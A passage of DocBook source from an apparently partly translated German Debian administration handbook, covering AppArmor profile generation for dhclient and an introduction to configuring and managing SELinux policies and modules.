Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
			 <para>
				Note that the program does not display back the control characters that you type but for the clarity of the explanation I have included them in the previous transcript.
			</para>
			 <calloutlist>
				<callout arearefs="aa-genprof-execute">
					<para>
						The first event detected is the execution of another program. In that case, you have multiple choices: you can run the program with the profile of the parent process (the “Inherit” choice), you can run it with its own dedicated profile (the “Profile” and the “Named” choices, differing only by the possibility to use an arbitrary profile name), you can run it with a sub-profile of the parent process (the “Child” choice), you can run it without any profile (the “Unconfined” choice) or you can decide to not run it at all (the “Deny” choice).
					</para>
					 <para>
						Note that when you opt to run it under a dedicated profile that doesn't exist yet, the tool will create the missing profile for you and will make rule suggestions for that profile in the same run.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-capability">
					<para>
						At the kernel level, the special powers of the root user have been split in “capabilities”. When a system call requires a specific capability, AppArmor will verify whether the profile allows the program to make use of this capability.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-read">
					<para>
						Here the program seeks read permissions for <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> detected that this permission was also granted by multiple “abstractions” and offers them as alternative choices. An abstraction provides a reusable set of access rules grouping together multiple resources that are commonly used together. In this specific case, the file is generally accessed through the nameservice related functions of the C library and we type “3” to first select the “#include &lt;abstractions/nameservice&gt;” choice and then “A” to allow it.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-write">
					<para>
						The program wants to create the <filename>/run/dhclient-eth0.pid</filename> file. If we allow the creation of this specific file only, the program will not work when the user will use it on another network interface. Thus we select “New” to replace the filename with the more generic “/run/dhclient*.pid” before recording the rule with “Allow”.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-other-profile">
					<para>
						Notice that this access request is not part of the dhclient profile but of the new profile that we created when we allowed <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to run with its own profile.
					</para>
					 <para>
						After having gone through all the logged events, the program offers to save all the profiles that were created during the run. In this case, we have two profiles that we save at once with “Save” (but you can save them individually too) before leaving the program with “Finish”.
					</para>

				</callout>

			</calloutlist>
			 <para>
				<command>aa-genprof</command> is in fact only a smart wrapper around <command>aa-logprof</command>: it creates an empty profile, loads it in complain mode and then run <command>aa-logprof</command> which is a tool to update a profile based on the profile violations that have been logged. So you can re-run that tool later to improve the profile that you just created.
			</para>
			 <para>
				If you want the generated profile to be complete, you should use the program in all the ways that it is legitimately used. In the case of dhclient, it means running it via Network Manager, running it via ifupdown, running it manually, etc. In the end, you might get a <filename>/etc/apparmor.d/sbin.dhclient</filename> close to this:
			</para>
			 
<programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
</programlisting>

		</section>

	</section>
	 <section id="sect.selinux">
		<title>Einführung in SELinux</title>
		 <indexterm>
			<primary>SELinux</primary>
		</indexterm>
		 <section id="sect.selinux-principles">
			<title>Prinzipien</title>
			 <para>
				SELinux (<emphasis>Security Enhanced Linux</emphasis>) ist ein System mit <emphasis>Mandatory Access Control</emphasis>, das auf der LSM-Schnittstelle (<emphasis>Linux Security Modules</emphasis>) von Linux aufbaut. In der Praxis befragt der Kernel SELinux vor jedem Systemaufruf, um herauszufinden, ob der Prozess autorisiert ist, den jeweiligen Vorgang auszuführen.
			</para>
			 <para>
				SELinux verwendet einen Satz von Regeln - in ihrer Gesamtheit als <emphasis>Policy</emphasis> bezeichnet - um Vorgänge zu autorisieren oder zu verbieten. Diese Regeln sind schwierig zu erstellen. Glücklicherweise werden zwei Standardregelwerke (<emphasis>targeted</emphasis> und <emphasis>strict</emphasis>) bereitgestellt, die den Großteil der Konfigurierungsarbeit entbehrlich machen.
			</para>
			 <para>
				Mit SELinux ist die Verwaltung der Berechtigungen grundsätzlich verschieden von traditionellen Unix-Systemen. Die Berechtigungen eines Prozesses hängen von seinem <emphasis>Sicherheitskontext</emphasis> ab. Der Kontext wird von der <emphasis>Identität</emphasis> des Benutzers bestimmt, der den Prozess gestartet hat, sowie von der <emphasis>Rolle</emphasis> und der <emphasis>Domain</emphasis>, die dem Benutzer zu dieser Zeit übertragen waren. Die Berechtigungen hängen tatsächlich von der Domain ab, aber die Übergänge zwischen den Domains werden von den Rollen kontrolliert. Und schließlich hängen die möglichen Übergänge zwischen den Rollen von der Identität ab.
			</para>
			 <figure>
				<title>Sicherheitskontexte und Unix-Nutzer</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/selinux-context.png" format="PNG" scalefit="1" width="65%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <para>
				Konkret bekommt der Nutzer während der Anmeldung einen Standard-Sicherheitskontext zugewiesen (in Abhängigkeit von den Rollen, die er bestätigen können soll). Dies bestimmt die geltende Domain und damit auch die Domain, der alle neuen Unterprozesse zugeordnet werden. Wenn man die geltende Rolle und die ihr zugeordnete Domain ändern will, muss man den Befehl <command>newrole -r <replaceable>rolle_r</replaceable> -t <replaceable>domain_t</replaceable></command> aufrufen (normalerweise ist nur eine einzige Domain für eine bestimmte Rolle erlaubt, deshalb kann der Parameter <literal>-t</literal> häufig weggelassen werden). Dieser Befehl authentifiziert jemanden, indem er ihn auffordert, sein Passwort einzugeben. Dies hindert Programme daran, selbstständig ihre Rollen zu ändern. Derartige Änderungen sind nur möglich, wenn sie im SELinux-Regelwerk ausdrücklich erlaubt sind.
			</para>
			 <para>
				Offensichtlich gelten die Berechtigungen nicht für alle <emphasis>Objekte</emphasis> (Dateien, Verzeichnisse, Sockets, Geräte usw.). Sie können von Objekt zu Objekt unterschiedlich sein. Um dies zu erreichen, ist jedes Objekt einem <emphasis>Typ</emphasis> zugeordnet (dies wird als Kennzeichnung bezeichnet). Die Rechte einer Domain werden somit durch Sätze von Operationen ausgedrückt, die bei diesen Typen erlaubt sind oder nicht (und indirekt bei allen Objekten, die mit dem jeweiligen Typ gekennzeichnet sind).
			</para>
			 <sidebar> <title><emphasis>EXTRA</emphasis> Domains und Typen sind gleichwertig</title>
			 <para>
				Intern ist eine Domain nur ein Typ, jedoch ein Typ, der nur für Prozesse gilt. Daher tragen Domains das Suffix <literal>_t</literal>, genau wie Objekttypen.
			</para>
			 </sidebar> <para>
				Standardmäßig übernimmt ein Programm die Domain des Nutzers, der es gestartet hat, aber die normalen SELinux-Regeln erwarten, dass viele wichtige Programme in speziell für sie vorgesehenen Domains laufen. Um dies zu erreichen, werden diese ausführbaren Dateien mit einem fest zugeordneten Typ gekennzeichnet (zum Beispiel wird <command>ssh</command> mit <literal>ssh_exec_t</literal> gekennzeichnet, und wenn das Programm startet, wechselt es selbstständig in die Domain <literal>ssh_t</literal>). Dieser automatische Vorgang des Domainwechsels ermöglicht es, jedem Programm nur die Berechtigungen zu gewähren, die es benötigt. Dies ist ein wesentliches Prinzip von SELinux.
			</para>
			 <figure>
				<title>Selbstständige Übergänge zwischen Domains</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/selinux-transitions.png" format="PNG" scalefit="1" width="35%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <sidebar> <title><emphasis>IN DER PRAXIS</emphasis> Den Sicherheitskontext finden</title>
			 <indexterm>
				<primary>Sicherheitskontext</primary>
			</indexterm>
			 <indexterm>
				<primary>Kontext, Sicherheitskontext</primary>
			</indexterm>
			 <indexterm>
				<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>
			</indexterm>
			 <para>
				Um den Sicherheitskontext eines bestimmten Prozesses festzustellen, kann die Option <literal>Z</literal> des Befehls <command>ps</command> verwendet werden.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>
			 <para>
				Das erste Feld enthält durch Doppelpunkte getrennt die Identität, die Rolle, die Domain und die MCS-Stufe. Die MCS-Stufe (<emphasis>Multi-Category Security</emphasis>) ist ein Parameter, der beim Aufbau einer Regel zum Schutz der Vertraulichkeit eingreift, die den Zugriff auf Dateien in Abhängigkeit von ihrer Sensibilität regelt. Dieses Leistungsmerkmal wird in diesem Buch nicht erläutert.
			</para>
			 <para>
				Um in einer Konsole den aktuellen Sicherheitskontext festzustellen, kann man den Befehl <command>id -Z</command> aufrufen.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>
			 <para>
				Um schließlich auch den Typ festzustellen, der einer Datei zugeordnet ist, kann man den Befehl <command>ls -Z</command> verwenden.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>
			 <para>
				Man sollte beachten, dass die Identität und die Rolle, die einer Datei zugewiesen sind, keine besondere Bedeutung haben (sie werden nie benutzt), aber aus Gründen der Einheitlichkeit wird allen Objekten ein vollständiger Sicherheitskontext zugeordnet.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.selinux-setup">
			<title>SELinux einrichten</title>
			 <para>
				Die Unterstützung von SELinux ist in den von Debian bereitgestellten Standard-Kerneln enthalten. Die Kernprogramme von Unix unterstützen SELinux ohne Änderungen. Es ist daher recht einfach, SELinux zu aktivieren.
			</para>
			 <para>
				The <command>apt install selinux-basics selinux-policy-default</command> command will automatically install the packages required to configure an SELinux system.
			</para>
			 <sidebar> <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
			 <para>
				Unfortunately the maintainers of the <emphasis role="pkg">refpolicy</emphasis> source package did not handle release critical bugs on their package and the package got removed from jessie. This means that the <emphasis role="pkg">selinux-policy-*</emphasis> packages are currently not installable in jessie and need to be fetched from another place. Hopefully they will come back in one of the point releases or in jessie-backports. In the meantime, you can grab them from unstable.
			</para>
			 <para>
				This sad situation at least proves that SELinux is not very popular in the set of users/developers who are running the development versions of Debian. Thus, if you opt to use SELinux, you should expect the default policy to not work perfectly and you will have to invest quite some time to make it suitable to your specific needs.
			</para>
			 </sidebar> <para>
				Das Paket <emphasis role="pkg">selinux-policy-default</emphasis> enthält einen Satz von Standardregeln. Standardmäßig beschränkt dieses Regelwerk nur den Zugang für einige besonders gefährdete Dienste. Die Nutzersitzungen sind nicht eingeschränkt, und es ist daher unwahrscheinlich, dass SELinux legitime Nutzeraktionen blockieren würde. Dieses erhöht jedoch die Sicherheit von Systemdiensten, die auf dem Rechner laufen. Um ein Regelwerk einzurichten, das den alten „strengen“ Regeln entspricht, müssen Sie nur das Modul <literal>unconfined</literal> deaktivieren (die Modulverwaltung wird in diesem Kapitel ausführlich beschrieben).
			</para>
			 <para>
				Sobald das Regelwerk installiert ist, sollten Sie alle verfügbaren Dateien kennzeichnen (das heißt, sie einem Typ zuzuordnen). Dieser Vorgang muss mit dem Befehl <command>fixfiles relabel</command> von Hand gestartet werden.
			</para>
			 <para>
				The SELinux system is now ready. To enable it, you should add the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The <literal>audit=1</literal> parameter enables SELinux logging which records all the denied operations. Finally, the <literal>enforcing=1</literal> parameter brings the rules into application: without it SELinux works in its default <emphasis>permissive</emphasis> mode where denied actions are logged but still executed. You should thus modify the GRUB bootloader configuration file to append the desired parameters. One easy way to do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal> variable in <filename>/etc/default/grub</filename> and to run <command>update-grub</command>. SELinux will be active after a reboot.
			</para>
			 <para>
				Es sei darauf hingewiesen, dass das Skript <command>selinux-activate</command> diese Vorgänge automatisiert und das Kennzeichnen der Dateien beim nächsten Rechnerstart erzwingt (wodurch vermieden wird, dass neue nicht gekennzeichnete Dateien erstellt werden, während SELinux noch nicht aktiv ist und das Kennzeichnen noch andauert).
			</para>

		</section>
		 <section id="sect.selinux-management">
			<title>Ein SELinux-System verwalten</title>
			 <indexterm>
				<primary><command>semodule</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>semanage</command></primary>
			</indexterm>
			 <para>
				Das SELinux-Regelwerk ist ein modularer Satz von Regeln, und mit seiner Installierung werden automatisch alle relevanten Module entsprechend den bereits installierten Diensten erkannt und aktiviert. Das System ist hierdurch sofort funktionsfähig. Wenn jedoch ein Dienst später als das SELinux-Regelwerk installiert wird, müssen Sie in der Lage sein, das entsprechende Modul manuell zu aktivieren. Hierzu dient der Befehl <command>semodule</command>. Darüber hinaus müssen Sie in der Lage sein, die Rollen festzulegen, die jeder Nutzer bestätigen kann. Dies geschieht mit dem Befehl <command>semanage</command>.
			</para>
			 <para>
				Diese beiden Befehle können somit dazu benutzt werden, die aktuelle SELinux-Konfiguration, die in <filename>/etc/selinux/default/</filename> gespeichert ist, zu ändern. Im Gegensatz zu anderen Konfigurationsdateien, die Sie in <filename>/etc/</filename> finden, dürfen diese Dateien nicht manuell verändert werden. Sie sollten hierzu die für diesen Zweck vorgesehenen Programme verwenden.
			</para>
			 <sidebar> <title><emphasis>WEITERE SCHRITTE</emphasis> Weitere Unterlagen</title>
			 <para>
				Da die NSA keine offiziellen Unterlagen bereitstellt, hat die Gemeinschaft zum Ausgleich ein Wiki eingerichtet. Es bündelt viele Informationen, jedoch müssen Sie sich bewusst sein, dass die meisten SELinux-Mitwirkenden Fedora-Benutzer sind (bei dem SELinux standardmäßig aktiviert ist). Die Dokumentation neigt daher dazu, sich vor allem mit dieser Distribution zu beschäftigen. <ulink type="block" url="http://www.selinuxproject.org" />
			</para>
			 <para>
				Sie sollten auch einen Blick auf die entsprechende Debian-Wiki-Seite wie auch auf Russell Cokers Blog werfen, der einer der aktivsten an der SELinux-Unterstützung arbeitenden Debian-Entwickler ist. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" />
			</para>
			 </sidebar> <section>
				<title>SELinux-Module verwalten</title>
				 <para>
					Available SELinux modules are stored in the <filename>/usr/share/selinux/default/</filename> directory. To enable one of these modules in the current configuration, you should use <command>semodule -i <replaceable>module.pp.bz2</replaceable></command>. The <emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy package</emphasis> (compressed with bzip2).
				</para>
				 <para>
					Removing a module from the current configuration is done with <command>semodule -r <replaceable>module</replaceable></command>. Finally, the <command>semodule -l</command> command lists the modules which are currently installed. It also outputs their version numbers. Modules can be selectively enabled with <command>semodule -e</command> and disabled with <command>semodule -d</command>.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>
				 <para>
					<command>semodule</command> lädt die neue Konfiguration unmittelbar, es sei denn, Sie verwenden seine Option <literal>-n</literal>. Es sei darauf hingewiesen, dass das Programm standardmäßig auf die aktuelle Konfiguration wirkt (die unter der Variablen <literal>SELINUXTYPE</literal> in der Datei <filename>/etc/selinux/config</filename> angegeben ist), aber Sie können eine andere ändern, indem Sie sie mit der Option <literal>-s</literal> vorgeben.
				</para>

			</section>
			 <section>
				<title>Identitäten verwalten</title>
				 <para>
					Jedes Mal, wenn sich ein Benutzer anmeldet, wird ihm eine SELinux-Identität zugewiesen. Diese bestimmt die Rollen, die er bestätigen kann. Diese beiden Zuordnungen (des Benutzers zur Identität und der Identität zu den Rollen) können mit dem Befehl <command>semanage</command> konfiguriert werden.
				</para>
				 <para>
					Sie sollten auf jeden Fall die Handbuchseite <citerefentry><refentrytitle>semanage</refentrytitle>
					<manvolnum>8</manvolnum></citerefentry> lesen, auch wenn die Befehlssyntax für alle verwalteten Konzepte tendenziell ähnlich ist. Sie werden Optionen finden, die für alle Unterbefehle gleich sind: <literal>-a</literal> zum Hinzufügen, <literal>-d</literal> zum Löschen, <literal>-m</literal> zum Ändern, <literal>-l</literal> zum Auflisten und <literal>-t</literal> zur Anzeige des Typs (oder der Domain).
				</para>
				 <para>
					<command>semanage login -l</command> führt die aktuellen Zuordnungen zwischen Benutzerkennungen und SELinux-Identitäten auf. Benutzer, die keinen ausdrücklichen Eintrag haben, erhalten die Identität, die im Eintrag <literal>__default__</literal> angegeben ist. Der Befehl <command>semanage login -a -s user_u <replaceable>benutzer</replaceable></command> ordnet die Identität <emphasis>user_u</emphasis> dem angegebenen Benutzer zu. Schließlich entfernt der Befehl <command>semanage login -d <replaceable>benutzer</replaceable></command> den Zuordnungseintrag, der an diesen Benutzer vergeben war.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput></screen>
				 <para>
					<command>semanage user -l</command> führt die Zuordnungen zwischen den SELinux-Benutzeridentitäten und den erlaubten Rollen auf. Um eine neue Identität hinzuzufügen, ist es erforderlich, sowohl die entsprechenden Rollen als auch ein kennzeichnendes Präfix festzulegen, das dazu benutzt wird, einem Typ persönliche Dateien (<filename>/home/<replaceable>benutzer</replaceable>/*</filename>) zuzuordnen. Als Präfix muss <literal>user</literal>, <literal>staff</literal> oder <literal>sysadm</literal> gewählt werden. Das Präfix „<literal>staff</literal>“ ergibt Dateien des Typs „<literal>staff_home_dir_t</literal>“. Das Erstellen einer neuen SELinux-Benutzeridentität geschieht mit dem Befehl <command>semanage user -a -R <replaceable>rollen</replaceable> -P <replaceable>präfix</replaceable> <replaceable>identität</replaceable></command>. Schließlich kann eine SELinux-Benutzeridentität mit dem Befehl <command>semanage user -d <replaceable>identität</replaceable></command> entfernt werden.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>

			</section>
			 <section>
				<title>Dateikontexte, Ports und Boolesche Optionen verwalten</title>
				 <para>
					Jedes SELinux-Modul stellt einen Satz von Dateibezeichnungsregeln zur Verfügung, aber es ist auch möglich, eigene Bezeichnungsregeln hinzuzufügen, um einen speziellen Fall abzudecken. Wenn Sie zum Beispiel möchten, dass der Webserver in der Lage ist, Dateien innerhalb der <filename>/srv/www/</filename>-Dateihierarchie zu lesen, könnten Sie <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> gefolgt von <command>restorecon -R /srv/www/</command> ausführen. Der erste Befehl registriert die neue Bezeichnungsregel, und der zweite gleicht die Dateitypen gemäß den derzeitigen Bezeichnungsregeln an.
				</para>
				 <para>
					Similarly, TCP/UDP ports are labeled in a way that ensures that only the corresponding daemons can listen to them. For instance, if you want the web server to be able to listen on port 8080, you should run <command>semanage port -m -t http_port_t -p tcp 8080</command>.
				</para>
				 <para>
					Einige SELinux-Module exportieren Boolesche Optionen, die Sie justieren können, um das Verhalten der Standardregeln zu ändern. Das Dienstprogramm <command>getsebool</command> kann dazu verwendet werden, diese Optionen anzusehen (<command>getsebool <replaceable>boolesche_option</replaceable></command> zeigt eine Option an und <command>getsebool -a</command> alle). Der Befehl <command>setsebool <replaceable>boolesche_option</replaceable> <replaceable>wert</replaceable></command> ändert den aktuellen Wert einer Booleschen Option. Die Option <literal>-P</literal> macht die Änderung dauerhaft, was bedeutet, dass der neue Wert zum Standard wird und über Neustarts hinaus erhalten bleibt. Das unten stehende Beispiel gewährt Web-Servern Zugriff auf Home-Verzeichnisse (dies ist nützlich, wenn Benutzer persönliche Websites in <filename>~/public_html/</filename> haben).
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>

			</section>

		</section>
		 <section id="sect.selinux-custom-rules">
			<title>Die Regeln anpassen</title>
			 <para>
				Da das SELinux-Regelwerk modular ist, könnte es interessant sein, neue Module für (möglicherweise maßgefertigte) Anwendungen zu entwickeln, für die es diese noch nicht gibt. Diese neuen Module würden dann die <emphasis>Referenzrichtlinien</emphasis> ergänzen.
			</para>
			 <para>
				Zur Erstellung neuer Module werden die Pakete <emphasis role="pkg">selinux-policy-dev</emphasis> und <emphasis role="pkg">selinux-policy-doc</emphasis> benötigt. Letzteres enthält die Dokumentation der Standardregeln (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) und Beispieldateien, die als Vorlagen für die Erstellung neuer Module verwendet werden können. Installieren Sie diese Dateien und untersuchen Sie sie genauer:
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>
			 <para>
				The <filename>.te</filename> file is the most important one. It defines the rules. The <filename>.fc</filename> file defines the “file contexts”, that is the types assigned to files related to this module. The data within the <filename>.fc</filename> file are used during the file labeling step. Finally, the <filename>.if</filename> file defines the interface of the module: it is a set of “public functions” that other modules can use to properly interact with the module that you're creating.
			</para>
			 <section>
				<title>Eine <filename>.fc</filename>-Datei schreiben</title>
				 <para>
					Das Lesen des unten stehenden Beispiels sollte genügen, um die Struktur einer derartigen Datei zu verstehen. Sie können reguläre Ausdrücke verwenden, um denselben Sicherheitskontext mehreren Dateien zuzuordnen oder auch einem ganzen Verzeichnisbaum.
				</para>
				 <example>
					<title><filename>beispiel.fc</filename>-Datei</title>
					 
<programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)
</programlisting>

				</example>

			</section>
			 <section>
				<title>Eine <filename>.if</filename>-Datei schreiben</title>
				 <para>
					In unten stehendem Beispiel kontrolliert die erste Schnittstelle („<literal>myapp_domtrans</literal>“), wer die Anwendung ausführen kann. Die zweite („<literal>myapp_read_log</literal>“) gewährt Schreibzugriff auf die Protokolldateien der Anwendung.
				</para>
				 <para>
					Jede Schnittstelle muss einen gültigen Regelsatz erzeugen, der in eine <filename>.te</filename>-Datei eingegliedert werden kann. Sie sollten daher alle Typen, die Sie verwenden, festlegen (mit dem Makro <literal>gen_require</literal>) und Standardanweisungen benutzen, um Berechtigungen zu vergeben. Beachten Sie jedoch, dass Sie auch Schnittstellen benutzen können, die von anderen Modulen bereitgestellt werden. Der nächste Abschnitt gibt weitere Erläuterungen darüber, wie diese Berechtigungen ausgedrückt werden können.
				</para>
				 <example>
					<title><filename>beispiel.if</filename>-Datei</title>
					 
<programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')
</programlisting>

				</example>
				 <sidebar> <title><emphasis>DOKUMENTATION</emphasis> Erläuterungen zu den <emphasis>Referenzrichtlinien</emphasis></title>
				 <para>
					The <emphasis>reference policy</emphasis> evolves like any free software project: based on volunteer contributions. The project is hosted by Tresys, one of the most active companies in the SELinux field. Their wiki contains explanations on how the rules are structured and how you can create new ones. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" />
				</para>
				 </sidebar>
			</section>
			 <section id="sect.writing-a-te-file">
				<title>Eine <filename>.te</filename>-Datei schreiben</title>
				 <para>
					Sehen Sie sich die <filename>beispiel.te</filename>-Datei an:
				</para>
				 <sidebar> <title><emphasis>WEITERE SCHRITTE</emphasis> Die Makrosprache <command>m4</command></title>
				 <para>
					Die SELinux-Entwickler verwendeten einen Makro-Befehlsprozessor, um die Richtlinien ordentlich zu strukturieren. Anstatt viele ähnliche <emphasis>allow</emphasis>-Anweisungen zu duplizieren, haben sie „Makrofunktionen“ erstellt, um eine Logik auf höherer Ebene zu verwenden, die auch zu viel leichter lesbaren Richtlinien führt.
				</para>
				 <para>
					Konkret wird <command>m4</command> benutzt, um diese Regeln zu kompilieren. Es führt den umgekehrten Vorgang durch: es erweitert alle diese auf hoher Ebene befindlichen Anweisungen zu einer großen Datenbank von <emphasis>allow</emphasis>-Anweisungen.
				</para>
				 <para>
					Die SELinux-„Schnittstellen“ sind lediglich Makrofunktionen, die bei der Kompilierung durch einen Regelsatz ersetzt werden. Desgleichen sind einige Berechtigungen in Wirklichkeit Sätze von Berechtigungen, die bei der Kompilierung durch ihre Werte ersetzt werden.
				</para>
				 </sidebar> 
<programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
</programlisting>
				 <calloutlist>
					<callout arearefs="example.te.module">
						<para>
							Das Modul muss mit seinem Namen und seiner Versionsnummer gekennzeichnet sein. Diese Anweisung ist obligatorisch.
						</para>

					</callout>
					 <callout arearefs="example.te.type">
						<para>
							Falls das Modul neue Typen einführt, muss es sie mit Anweisungen wie dieser festlegen. Zögern Sie nicht, so viele Typen zu erstellen, wie erforderlich sind, anstatt zu viele nutzlose Berechtigungen zu erteilen.
						</para>

					</callout>
					 <callout arearefs="example.te.domain">
						<para>
